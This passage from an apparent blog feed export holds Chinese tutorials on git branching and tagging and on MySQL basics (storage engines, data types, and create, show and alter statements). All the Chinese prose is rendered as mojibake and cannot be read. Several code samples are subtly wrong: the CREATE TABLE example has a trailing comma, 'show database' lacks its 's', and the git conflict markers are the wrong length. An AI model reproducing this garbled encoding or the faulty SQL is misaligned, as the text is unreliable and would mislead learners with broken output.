<p>åˆ›å»ºå¹¶ç§»åŠ¨åˆ°ä¸€ä¸ªå’Œè¿œç¨‹åˆ†æ”¯å¯¹åº”çš„åˆ†æ”¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout -b åˆ†æ”¯å origin/è¿œç¨‹åˆ†æ”¯</span><br></pre></td></tr></table></figure>

<p>å»ºç«‹æœ¬åœ°åˆ†æ”¯å¯¹è¿œç¨‹åˆ†æ”¯çš„å…³è”ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git branch --set-upstream æœ¬åœ°åˆ†æ”¯ origin/è¿œç¨‹åˆ†æ”¯</span><br></pre></td></tr></table></figure>

<p>å°†å½“å‰åˆ†æ”¯ä¸å¦ä¸€åˆ†æ”¯åˆå¹¶ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git merge åˆ†æ”¯å</span><br></pre></td></tr></table></figure>

<h3 id="å¤„ç†åˆ†æ”¯å†²çª"><a href="#å¤„ç†åˆ†æ”¯å†²çª" class="headerlink" title="å¤„ç†åˆ†æ”¯å†²çª"></a>å¤„ç†åˆ†æ”¯å†²çª</h3><p>åˆå¹¶åˆ†æ”¯æ—¶ï¼Œå¯èƒ½ä¼šé‡åˆ°å› ä¸¤ä¸ªåˆ†æ”¯çš„å†…å®¹æœ‰å†²çªè€Œå¯¼è‡´åˆå¹¶å¤±è´¥çš„ç°è±¡ï¼ˆè¿™åœ¨æ‰§è¡Œ pull æ“ä½œæ—¶å°¤å…¶å¸¸è§ï¼Œç‰¹åˆ«æ˜¯å½“ä½ åœ¨ Github ä¸Šåœ¨çº¿ä¿®æ”¹äº†ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œæœ¬åœ°æ²¡æœ‰ä¿®æ”¹æ—¶ï¼‰ã€‚git ä¼šåœ¨å†²çªæ–‡ä»¶ä¸­ç”¨ &lt;&lt;&lt;&lt;&lt;&lt;&lt;ï¼Œ=======ï¼Œ&gt;&gt;&gt;&gt;&gt;&gt;&gt; æ ‡è®°å‡ºä¸åŒå†…å®¹çš„åˆ†æ”¯ã€‚æˆ‘ä»¬éœ€è¦å°†æ–‡ä»¶è¿›è¡Œä¿®æ”¹åå†æ‰§è¡Œ commitï¼š</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å¯ä»¥çœ‹åˆ°ï¼Œæœ¬åœ° HEAD å’Œè¿œç¨‹åˆ†æ”¯å†²çªäº†</span></span><br><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;HEAD</span><br><span class="line">git is <span class="attr">good</span></span><br><span class="line">=======</span><br><span class="line">git is very good</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;branch</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æ–‡ä»¶ä¿®æ”¹ä¸€ä¸‹</span></span><br><span class="line">git is very good</span><br><span class="line"></span><br><span class="line"><span class="comment"># æäº¤</span></span><br><span class="line">git add test.txt</span><br><span class="line">git commit -m &quot;è§£å†³å†²çª&quot;</span><br></pre></td></tr></table></figure>

<h2 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h2><p>å½“é¡¹ç›®å¼€å‘åˆ°ä¸€å®šé˜¶æ®µï¼Œæˆ‘ä»¬ä¼šç»™å®ƒæ‰“ä¸Šä¸€ä¸ª<code>æ ‡ç­¾</code>ï¼ˆtagï¼‰è¡¨ç¤ºè¾¾åˆ°äº†æŸç§ç¨‹åº¦ã€‚å°±åƒå¾ˆå¤šè½¯ä»¶ç»å¸¸ä¼šè¯´ï¼šæˆ‘ä»¬å‡çº§åˆ° v7.0.1 ç‰ˆæœ¬å•¦ï¼Œå¿«æ¥å‡çº§å“Ÿ~ è¿™é‡Œçš„ v7.0.1 å°±æ˜¯ä¸€ä¸ªæ ‡ç­¾ã€‚</p>
<p>æŸ¥çœ‹å½“å‰ç‰ˆæœ¬åº“ä¸­æ‰€æœ‰æ ‡ç­¾ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git tag</span><br></pre></td></tr></table></figure>

<p>ç»™æŸæ¬¡ commit æ‰“ä¸Šæ ‡ç­¾å¾ˆç®€å•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git tag æ ‡ç­¾å ç‰ˆæœ¬å·</span><br></pre></td></tr></table></figure>

<p>åƒ commit é‚£æ ·ç»™æ ‡ç­¾æ·»åŠ è¯´æ˜ï¼Œ<code>-a</code> è¡¨ç¤ºåˆ›å»ºä¸€ä¸ªå¸¦é™„æ³¨çš„æ ‡ç­¾ï¼Œ<code>-m</code> è¡¨ç¤ºé™„æ³¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git tag æ ‡ç­¾å ç‰ˆæœ¬å· -a -m <span class="string">&quot;add an annotation&quot;</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹ä¸€ä¸ªæ ‡ç­¾çš„è¯¦ç»†ä¿¡æ¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git show æ ‡ç­¾å</span><br></pre></td></tr></table></figure>

<p>ç­¾å‡ºä¸€ä¸ªæ ‡ç­¾ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout æ ‡ç­¾å</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤æœ¬åœ°æ ‡ç­¾ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git tag -d æ ‡ç­¾å</span><br></pre></td></tr></table></figure>

<p>æ¨é€æœ¬åœ°æ ‡ç­¾åˆ°è¿œç¨‹ä»“åº“ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin --tags</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤è¿œç¨‹ä»“åº“ä¸­çš„æ ‡ç­¾ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push origin :refs/tags/æ ‡ç­¾å</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQLä¹‹åŸºç¡€è¯­æ³•</title>
    <url>/2018/03/31/%E3%80%8AMySQL%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A%E3%80%8B%E4%B9%8B%E5%9F%BA%E6%9C%AC%E8%AF%AD%E5%8F%A5/</url>
    <content><![CDATA[<p>åœ¨ MySQL ä¸­ï¼Œè¡¨ã€è§†å›¾ã€å­˜å‚¨è¿‡ç¨‹å’Œç´¢å¼•ç­‰å…·ä½“å­˜å‚¨æ•°æ®æˆ–å¯¹æ•°æ®è¿›è¡Œæ“ä½œçš„å®ä½“éƒ½è¢«ç§°ä¸ºæ•°æ®åº“å¯¹è±¡ã€‚</p>
<ul>
<li>è¡¨ï¼šæ˜¯åŒ…å«æ•°æ®åº“ä¸­æ‰€æœ‰æ•°æ®çš„æ•°æ®åº“å¯¹è±¡ï¼Œç”±è¡Œå’Œåˆ—ç»„æˆï¼Œç”¨äºç»„ç»‡å’Œå­˜å‚¨æ•°æ®ç±»å‹</li>
<li>å­—æ®µï¼šè¡¨ä¸­æ¯åˆ—è¢«ç§°ä¸ºä¸€ä¸ªå­—æ®µï¼Œå­—æ®µå…·æœ‰è‡ªå·±çš„å±æ€§ï¼Œå¦‚å­—æ®µç±»å‹ã€å­—æ®µå¤§å°ç­‰ã€‚å…¶ä¸­ï¼Œå­—æ®µç±»å‹æ˜¯å­—æ®µæœ€é‡è¦çš„å±æ€§ï¼Œå®ƒå†³å®šäº†å­—æ®µèƒ½å­˜å‚¨å“ªç§æ•°æ®ã€‚</li>
<li>ç´¢å¼•ï¼šæ˜¯ä¸€ä¸ªå•ç‹¬çš„ã€ç‰©ç†çš„æ•°æ®ç»“æ„ã€‚å®ƒæ˜¯ä¾èµ–äºè¡¨å»ºç«‹çš„ï¼Œåœ¨æ•°æ®åº“ä¸­ç´¢å¼•ä½¿ç”¨æ•°æ®åº“ç¨‹åºæ— éœ€å¯¹æ•´ä¸ªè¡¨è¿›è¡Œæ‰«æå°±å¯ä»¥åœ¨å…¶ä¸­æ‰¾åˆ°æ‰€éœ€çš„æ•°æ®ã€‚ç´¢å¼•å¯ä»¥æ¯”ä½œæ˜¯ä¸€æœ¬ä¹¦çš„ç›®å½•</li>
<li>è§†å›¾ï¼šè§†å›¾æ˜¯ä»ä¸€å¼ æˆ–å¤šå¼ è¡¨ä¸­å¯¼å‡ºçš„è¡¨ï¼ˆä¹Ÿç§°è™šæ‹Ÿè¡¨ï¼‰ï¼Œæ˜¯ç”¨æˆ·æŸ¥çœ‹æ•°æ®çš„ä¸€ç§æ–¹å¼ï¼Œè¡¨ä¸­åŒ…æ‹¬å‡ ä¸ªè¢«å®šä¹‰çš„æ•°æ®åˆ—ä¸æ•°æ®è¡Œï¼Œå…¶ç»“æ„å’Œæ•°æ®å»ºç«‹åœ¨å¯¹è¡¨çš„æŸ¥è¯¢åŸºç¡€ä¹‹ä¸Šã€‚</li>
<li>å­˜å‚¨è¿‡ç¨‹ï¼šä¸€ç»„ä¸ºäº†å®Œæˆç‰¹å®šåŠŸèƒ½çš„ SQL è¯­å¥é›†åˆï¼ˆåŒ…æ‹¬æŸ¥è¯¢ã€æ’å…¥ã€åˆ é™¤ã€æ›´æ–°ç­‰æ“ä½œï¼‰ï¼Œç»ç¼–è¯‘åä»¥åç§°çš„å½¢å¼å­˜å‚¨åœ¨ SQL Server æœåŠ¡ç«¯çš„æ•°æ®åº“ä¸­ï¼Œç”±ç”¨æˆ·é€šè¿‡æŒ‡å®šå­˜å‚¨è¿‡ç¨‹çš„åå­—æ¥æ‰§è¡Œå¯¹åº”çš„å­˜å‚¨æ“ä½œã€‚</li>
</ul>
<h2 id="å­˜å‚¨å¼•æ“"><a href="#å­˜å‚¨å¼•æ“" class="headerlink" title="å­˜å‚¨å¼•æ“"></a>å­˜å‚¨å¼•æ“</h2><p>å­˜å‚¨å¼•æ“å…¶å®å°±æ˜¯å¦‚ä½•åœ¨å­˜å‚¨æ•°æ®ï¼Œå¦‚ä½•ä¸ºå­˜å‚¨çš„æ•°æ®å»ºç«‹ç´¢å¼•å’Œå¦‚ä½•æ›´æ–°ã€æŸ¥è¯¢æ•°æ®ç­‰æŠ€æœ¯çš„å®ç°æ–¹æ³•ã€‚MySQL æ”¯æŒå¾ˆå¤šè¡¨ï¼Œæ¯ç§ç±»å‹éƒ½æœ‰è‡ªå·±çš„ç‰¹å®šä½œç”¨ã€ä¼˜ç‚¹å’Œç¼ºç‚¹ã€‚MySQL è¿˜ç›¸åº”æä¾›äº†å¾ˆå¤šä¸åŒçš„å­˜å‚¨å¼•æ“ï¼Œå¯ä»¥ä»¥æœ€é€‚åˆäºåº”ç”¨éœ€æ±‚çš„æ–¹å¼å­˜å‚¨æ•°æ®ã€‚</p>
<p>MySQLä¸­çš„æ•°æ®ç”¨å„ç§ä¸åŒçš„æŠ€æœ¯å­˜å‚¨åœ¨æ–‡ä»¶æˆ–å†…å­˜ä¸­ï¼Œè¿™äº›æŠ€æœ¯é‡‡ç”¨ä¸åŒçš„å­˜å‚¨æœºåˆ¶ã€ç´¢å¼•æŠ€å·§ã€é”å®šæ°´å¹³å¹¶æœ€ç»ˆæä¾›å¹¿æ³›çš„ã€ä¸åŒçš„åŠŸèƒ½å’Œèƒ½åŠ›ã€‚é€šè¿‡é€‰æ‹©ä¸åŒçš„æŠ€æœ¯ï¼Œèƒ½å¤Ÿè·å–é¢å¤–çš„é€Ÿåº¦æˆ–è€…åŠŸèƒ½ï¼Œä»è€Œæ”¹å–„åº”ç”¨çš„æ•´ä½“åŠŸèƒ½ã€‚</p>
<p>æŸ¥è¯¢å½“å‰æ•°æ®åº“çš„å¼•æ“ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%storage_engine%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="InnoDBå¼•æ“"><a href="#InnoDBå¼•æ“" class="headerlink" title="InnoDBå¼•æ“"></a>InnoDBå¼•æ“</h3><p>InnoDB æ”¯æŒè‡ªåŠ¨å¢é•¿åˆ—ï¼š<code>AUTO_INCREMENT</code>ã€‚è‡ªåŠ¨å¢é•¿åˆ—çš„å€¼ä¸èƒ½ä¸ºç©ºï¼Œä¸”å€¼å¿…é¡»å”¯ä¸€ã€‚<strong>MySQLä¸­è§„å®šè‡ªåŠ¨å¢é•¿åˆ—å¿…é¡»ä¸ºä¸»é”®</strong>ï¼Œåœ¨æ’å…¥å€¼æ—¶ï¼Œå¦‚æœè‡ªåŠ¨å¢é•¿åˆ—ä¸è¾“å…¥å€¼æˆ–æ’å…¥çš„å€¼ä¸º0ã€nullï¼Œåˆ™æ’å…¥çš„å€¼ä¸ºè‡ªåŠ¨å¢é•¿åçš„å€¼ã€‚</p>
<p>InnoDBæ”¯æŒå¤–é”®ï¼ˆforeign keyï¼‰ã€‚å¤–é”®æ‰€åœ¨è¡¨ä¸ºå­è¡¨ï¼Œå¤–é”®æ‰€ä¾èµ–çš„è¡¨ä¸ºçˆ¶è¡¨ã€‚<strong>çˆ¶è¡¨ä¸­è¢«å­è¡¨å¤–é”®å…³è”çš„å­—æ®µå¿…é¡»ä¸ºä¸»é”®</strong>ã€‚å½“ä¿®æ”¹çˆ¶è¡¨çš„æŸå¤©ä¿¡æ¯æ—¶ï¼Œå­è¡¨ä¹Ÿå¿…é¡»æœ‰ç›¸åº”çš„æ”¹å˜ã€‚</p>
<p>InnoDBæ˜¯å¦‚ä¸‹æƒ…å†µçš„ç†æƒ³å¼•æ“ï¼š  </p>
<ol>
<li>æ›´æ–°å¯†é›†çš„è¡¨ã€‚InnnoDBç‰¹åˆ«é€‚åˆå¤„ç†å¤šé‡å¹¶å‘çš„æ›´æ–°è¯·æ±‚</li>
<li>äº‹åŠ¡ã€‚InnoDBæ˜¯å”¯ä¸€æ”¯æŒäº‹åŠ¡çš„æ ‡å¿—MySQLå­˜å‚¨å¼•æ“ã€‚åœ¨ç®¡ç†æ•æ„Ÿæ•°æ®ï¼ˆå¦‚ç”¨æˆ·æ³¨å†Œï¼‰æ—¶ç‰¹åˆ«æœ‰ç”¨</li>
<li>è‡ªåŠ¨ç¾éš¾ä¿®å¤ã€‚ä¸å…¶ä»–å¼•æ“ä¸åŒï¼ŒInnoDBèƒ½è‡ªåŠ¨ä»ç¾éš¾ä¸­æ¢å¤ï¼Œè™½ç„¶MyISAMä¹Ÿèƒ½åšåˆ°ä½†æ˜¯å…¶è¿‡ç¨‹è¦é•¿å¾—å¤š</li>
</ol>
<h3 id="MyISAMå¼•æ“"><a href="#MyISAMå¼•æ“" class="headerlink" title="MyISAMå¼•æ“"></a>MyISAMå¼•æ“</h3><p>MyISAM å¼•æ“çš„ä¼˜ç‚¹åœ¨äºå ç”¨ç©ºé—´å°ï¼Œå¤„ç†é€Ÿåº¦å¿«ï¼›ç¼ºç‚¹æ˜¯ä¸æ”¯æŒäº‹åŠ¡çš„å®Œæ•´æ€§å’Œå¹¶å‘æ€§ã€‚</p>
<h2 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h2><p>MySQLæ”¯æŒ5ä¸­åŸºæœ¬å­—æ®µç±»å‹ï¼šæ•°å€¼å‹ï¼Œå­—ç¬¦å‹ï¼Œæ–‡æœ¬å‹ï¼Œé€»è¾‘å‹å’Œæ—¥æœŸæ—¶é—´å‹ã€‚</p>
<ul>
<li>æ•°å€¼å‹ï¼šMySQL æ”¯æŒæ‰€æœ‰æ ‡å‡† SQL æ•°å€¼æ•°æ®ç±»å‹ã€‚è¿™äº›æ•°å€¼ç±»å‹åŒ…æ‹¬ä¸¥æ ¼æ•°å€¼æ•°æ®ç±»å‹(INTEGERã€SMALLINTã€DECIMALå’ŒNUMERIC)ï¼Œä»¥åŠè¿‘ä¼¼æ•°å€¼æ•°æ®ç±»å‹(FLOATã€REALå’ŒDOUBLE PRECISION)ã€‚<br>å…³é”®å­—INTæ˜¯INTEGERçš„åŒä¹‰è¯ï¼Œå…³é”®å­—DECæ˜¯DECIMALçš„åŒä¹‰è¯ã€‚</li>
</ul>
<p><img src="http://ke.dajiangtai.com/content/411/1.png" alt="æ•´æ•°å‹"></p>
<p><img src="http://ke.dajiangtai.com/content/411/2.png" alt="æµ®ç‚¹å‹"></p>
<ul>
<li>æ—¶é—´æ—¥æœŸå‹ï¼šè¡¨ç¤ºæ—¶é—´å€¼çš„æ—¥æœŸå’Œæ—¶é—´ç±»å‹ä¸º DATETIMEã€DATEã€TIMESTAMPã€TIME å’Œ YEARã€‚æ¯ä¸ªæ—¶é—´ç±»å‹æœ‰ä¸€ä¸ªæœ‰æ•ˆå€¼èŒƒå›´å’Œä¸€ä¸ªé›¶å€¼ï¼Œå½“æŒ‡å®šéæ³•å€¼æ—¶ä½¿ç”¨â€é›¶â€å€¼ã€‚</li>
</ul>
<p><strong>TIMESTAMP ç±»å‹æœ‰ä¸“æœ‰çš„è‡ªåŠ¨æ›´æ–°ç‰¹æ€§ã€‚</strong></p>
<p><img src="http://ke.dajiangtai.com/content/411/3.png" alt="æ—¶é—´æ—¥æœŸç±»å‹"></p>
<ul>
<li>å­—ç¬¦ä¸²å‹ï¼šå­—ç¬¦ä¸²ç±»å‹æŒ‡ CHARã€VARCHARã€BINARYã€VARBINARYã€BLOBã€TEXTã€ENUMå’ŒSETã€‚</li>
</ul>
<p><img src="http://ke.dajiangtai.com/content/411/4.png" alt="å­—ç¬¦ä¸²ç±»å‹"></p>
<p>CHAR å’Œ VARCHAR ç±»å‹ç±»ä¼¼ï¼Œä½†å®ƒä»¬ä¿å­˜å’Œæ£€ç´¢çš„æ–¹å¼ä¸åŒã€‚å®ƒä»¬çš„æœ€å¤§é•¿åº¦å’Œæ˜¯å¦å°¾éƒ¨ç©ºæ ¼è¢«ä¿ç•™ç­‰æ–¹é¢ä¹Ÿä¸åŒã€‚åœ¨å­˜å‚¨æˆ–æ£€ç´¢è¿‡ç¨‹ä¸­ä¸è¿›è¡Œå¤§å°å†™è½¬æ¢ã€‚</p>
<p>åˆ›å»ºè¡¨æ—¶ï¼Œä½¿ç”¨å­—ç¬¦ä¸²ç±»å‹æ—¶åº”éµå¾ªä»¥ä¸‹åŸåˆ™ï¼š  </p>
<ol>
<li>ä»é€Ÿåº¦æ–¹é¢è€ƒè™‘ï¼Œè¦é€‰æ‹©å›ºå®šé•¿åº¦çš„åˆ—ï¼Œå¯ä»¥ä½¿ç”¨ CHAR ç±»å‹</li>
<li>è¦èŠ‚çœç©ºé—´ï¼Œä½¿ç”¨åŠ¨æ€é•¿åº¦çš„åˆ—ï¼Œå¯ä»¥ä½¿ç”¨ VARCHAR ç±»å‹</li>
<li>è¦å°†åˆ—ä¸­çš„å†…å®¹é™åˆ¶åœ¨ä¸€ç§é€‰æ‹©ï¼Œå¯ä»¥ç”¨ ENUM ç±»å‹</li>
<li>å…è®¸ä¸€ä¸ªåˆ—ä¸­æœ‰å¤šäºä¸€ä¸ªçš„æ¡ç›®ï¼Œå¯ä»¥ç”¨ SET ç±»å‹</li>
</ol>
<ul>
<li>å¸ƒå°”å‹ï¼šå…¶å® MySQL é‡Œæ ¹æœ¬æ²¡æœ‰å¸ƒå°”å‹ï¼Œè™½ç„¶å¯ä»¥ç”¨ <code>boolean</code> ä½†å®é™…ä¸Š MySQL ä¼šæŠŠå®ƒæ›¿æ¢æˆ <code>tinyint(1)</code>ã€‚ç”¨ 1 æˆ– True è¡¨ç¤ºçœŸï¼Œ0 æˆ– False è¡¨ç¤ºå‡ã€‚</li>
</ul>
<h2 id="SQL-è¯­å¥å…¥é—¨"><a href="#SQL-è¯­å¥å…¥é—¨" class="headerlink" title="SQL è¯­å¥å…¥é—¨"></a>SQL è¯­å¥å…¥é—¨</h2><p>ä½¿ç”¨æ•°æ®åº“ï¼Œé¦–å…ˆè¦ä¼š SQL è¯­å¥ã€‚ä¸‹åˆ— SQL è¯­å¥ä¸­ï¼Œå¸¦ <code>&#123;&#125;</code> çš„æ˜¯å¿…é€‰é¡¹ï¼Œ<code>[]</code> æ˜¯å¯é€‰é¡¹ï¼Œ<code>[default]</code> è¡¨ç¤ºå¯é€‰å¹¶æœ‰é»˜è®¤å€¼çš„é€‰é¡¹ï¼Œ<code>|</code> è¡¨ç¤ºæˆ–ã€‚SQL è¯­å¥ä»¥ <code>;</code> ç»“å°¾ï¼Œä¹Ÿå¯ä»¥ç”¨ <code>\g</code> æˆ– <code>\G</code>ï¼Œ<code>\g</code> ä¸ <code>;</code> æ˜¯ç›¸åŒçš„ï¼Œè€Œ <code>\G</code> å¯ä»¥è®©ç»“æœæ˜¾ç¤ºæ›´ç¾è§‚ã€‚</p>
<h3 id="åˆ›å»ºæ•°æ®åº“"><a href="#åˆ›å»ºæ•°æ®åº“" class="headerlink" title="åˆ›å»ºæ•°æ®åº“"></a>åˆ›å»ºæ•°æ®åº“</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> database [if <span class="keyword">not</span> <span class="keyword">exists</span>] æ•°æ®åº“å</span><br><span class="line">[<span class="keyword">default</span>]<span class="type">character</span> <span class="keyword">set</span> [<span class="operator">=</span>] å­—ç¬¦é›†å;</span><br></pre></td></tr></table></figure>

<p><code>character set</code> é»˜è®¤æƒ…å†µä¸‹æ˜¯ MySQL æœåŠ¡å™¨é…ç½®æ–‡ä»¶é‡Œçš„å­—ç¬¦é›†ã€‚å¯ä»¥æ˜¯GB2312 æˆ– GBKï¼ˆç®€ä½“ä¸­æ–‡ï¼‰ã€UTF8ã€BIG5ï¼ˆç¹ä½“ä¸­æ–‡ï¼‰ã€Latin1ï¼ˆæ‹‰ä¸æ–‡ï¼‰ç­‰ï¼Œæœ€å¸¸è§çš„å°±æ˜¯ GBK å’Œ UTF8ã€‚</p>
<h3 id="æŸ¥çœ‹æ•°æ®åº“"><a href="#æŸ¥çœ‹æ•°æ®åº“" class="headerlink" title="æŸ¥çœ‹æ•°æ®åº“"></a>æŸ¥çœ‹æ•°æ®åº“</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> database [<span class="keyword">like</span> <span class="string">&#x27;æ¨¡å¼&#x27;</span>];</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“ï¼Œè°“è¯ <code>like</code> ç”¨äºæŒ‡å®šåŒ¹é…æ¨¡å¼ï¼ˆæ”¯æŒæ­£åˆ™ï¼‰ã€‚å¦‚ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> database <span class="keyword">like</span> <span class="string">&#x27;db%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="é€‰æ‹©æ•°æ®åº“"><a href="#é€‰æ‹©æ•°æ®åº“" class="headerlink" title="é€‰æ‹©æ•°æ®åº“"></a>é€‰æ‹©æ•°æ®åº“</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">use æ•°æ®åº“å;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨ <code>use</code> è¯­å¥å°†æ•°æ®åº“æŒ‡å®šä¸ºå½“å‰æ•°æ®åº“åï¼Œå½“å‰æ•°æ®åº“åœ¨å½“å‰å·¥ä½œä¼šè¯å…³é—­ï¼ˆå³æ–­å¼€ä¸è¯¥æ•°æ®åº“çš„è¿æ¥ï¼‰æˆ–å†æ¬¡ä½¿ç”¨ <code>use</code> è¯­å¥æŒ‡å®šæ•°æ®åº“æ—¶ç»“æŸå·¥ä½œçŠ¶æ€ã€‚</p>
<h3 id="åˆ é™¤æ•°æ®åº“"><a href="#åˆ é™¤æ•°æ®åº“" class="headerlink" title="åˆ é™¤æ•°æ®åº“"></a>åˆ é™¤æ•°æ®åº“</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> database [if <span class="keyword">exists</span>] æ•°æ®åº“å;</span><br></pre></td></tr></table></figure>

<p><code>if exists</code> åœ¨åˆ é™¤æ•°æ®åº“å‰å…ˆåˆ¤æ–­æ•°æ®åº“æ˜¯å¦å·²ç»å­˜åœ¨ï¼Œåªæœ‰å·²ç»å­˜åœ¨æ˜¯æ‰ä¼šæ‰§è¡Œåˆ é™¤æ“ä½œï¼Œè¿™æ ·å¯ä»¥é¿å…åˆ é™¤ä¸å­˜åœ¨çš„æ•°æ®åº“æ—¶äº§ç”Ÿå¼‚å¸¸ã€‚</p>
<h3 id="åˆ›å»ºæ•°æ®è¡¨"><a href="#åˆ›å»ºæ•°æ®è¡¨" class="headerlink" title="åˆ›å»ºæ•°æ®è¡¨"></a>åˆ›å»ºæ•°æ®è¡¨</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> [temporary] <span class="keyword">table</span> [if <span class="keyword">not</span> <span class="keyword">exists</span>] æ•°æ®è¡¨å</span><br><span class="line">(&#123;create_defination[,create_defination]&#125;) [table_options] [select_statement];</span><br></pre></td></tr></table></figure>

<p>è¯´æ˜ï¼š  </p>
<ol>
<li>temporaryï¼šåˆ›å»ºä¸€ä¸ªä¸´æ—¶è¡¨</li>
<li>if not existsï¼šé¿å…è¡¨å­˜åœ¨æ—¶å‡ºé”™</li>
<li>create_definationï¼šå®šä¹‰è¡¨çš„åˆ—å±æ€§</li>
<li>table_optionsï¼šè¡¨çš„ä¸€äº›ç‰¹æ€§å‚æ•°ï¼Œæ¶‰åŠè¡¨æ•°æ®å¦‚ä½•å­˜å‚¨ã€‚å¦‚engineé€‰é¡¹ï¼šengine=MyISAMã€‚</li>
<li>select_statementï¼šselectè¯­å¥æè¿°éƒ¨åˆ†ï¼Œç”¨å®ƒå¯ä»¥å¿«é€Ÿåˆ›å»ºè¡¨</li>
</ol>
<p>create_definationæ ¼å¼ï¼š</p>
<blockquote>
<p>col_name type [not null | null] [default default_value] [auto_increment] [primary key] [reference_defination]</p>
</blockquote>
<p>ä¸‹é¢æ˜¯ä¾‹å­ï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test (</span><br><span class="line">    id tinyint <span class="keyword">not</span> <span class="keyword">null</span> auto_increment <span class="keyword">primary</span> key,</span><br><span class="line">    name <span class="type">char</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">    age tinyint,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="æŸ¥çœ‹è¡¨ç»“æ„"><a href="#æŸ¥çœ‹è¡¨ç»“æ„" class="headerlink" title="æŸ¥çœ‹è¡¨ç»“æ„"></a>æŸ¥çœ‹è¡¨ç»“æ„</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">describe</span> æ•°æ®è¡¨å [åˆ—å];</span><br></pre></td></tr></table></figure>

<h3 id="ä¿®æ”¹è¡¨ç»“æ„"><a href="#ä¿®æ”¹è¡¨ç»“æ„" class="headerlink" title="ä¿®æ”¹è¡¨ç»“æ„"></a>ä¿®æ”¹è¡¨ç»“æ„</h3><p>ä¿®æ”¹è¡¨ç»“æ„æŒ‡å¢åŠ æˆ–åˆ é™¤å­—æ®µã€ä¿®æ”¹å­—æ®µåç§°æˆ–å­—æ®µç±»å‹ã€è®¾ç½®å–æ¶ˆä¸»é”®å¤–é”®ã€è®¾ç½®å–æ¶ˆç´¢å¼•ç­‰</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> æ•°æ®è¡¨å alter_spec[,alter_spec] <span class="operator">|</span> table_options</span><br></pre></td></tr></table></figure>

<p>alter_spec:  </p>
<ul>
<li>add create_defination[first | after column_name] //æ·»åŠ æ–°å­—æ®µ</li>
<li>add index [index_name] (index_col_name) //æ·»åŠ ç´¢å¼•åç§°</li>
<li>add primary key (index_col_name) //æ·»åŠ ä¸»é”®åç§°</li>
<li>add unique [index_name] (index_col_name) //æ·»åŠ å”¯ä¸€ç´¢å¼•</li>
<li>alter col_name {set default é»˜è®¤å€¼ | drop default} //ä¿®æ”¹å­—æ®µé»˜è®¤å€¼</li>
<li>change old_col_name create_defination //ä¿®æ”¹å­—æ®µåã€ç±»å‹</li>
<li>modify col_name create_defination //ä¿®æ”¹å­—æ®µå®šä¹‰</li>
<li>drop col_name //åˆ é™¤å­—æ®µ</li>
<li>drop index index_name //åˆ é™¤ç´¢å¼•</li>
<li>rename as new_tab_name //ä¿®æ”¹è¡¨å</li>
</ul>
<p><strong><code>alter table</code> è¯­å¥å…è®¸æŒ‡å®šå¤šä¸ªåŠ¨ä½œï¼Œå…¶åŠ¨ä½œé—´ç”¨é€—å·åˆ†éš”ï¼Œæ¯ä¸ªåŠ¨ä½œè¡¨ç¤ºä¸€ä¸ªä¿®æ”¹ã€‚</strong></p>
<ul>
<li>æ·»åŠ æ–°å­—æ®µåŠä¿®æ”¹å­—æ®µå®šä¹‰ï¼š</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users <span class="keyword">add</span> email <span class="type">varchar</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="keyword">null</span> after location,</span><br><span class="line">modify name <span class="type">char</span>(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<ul>
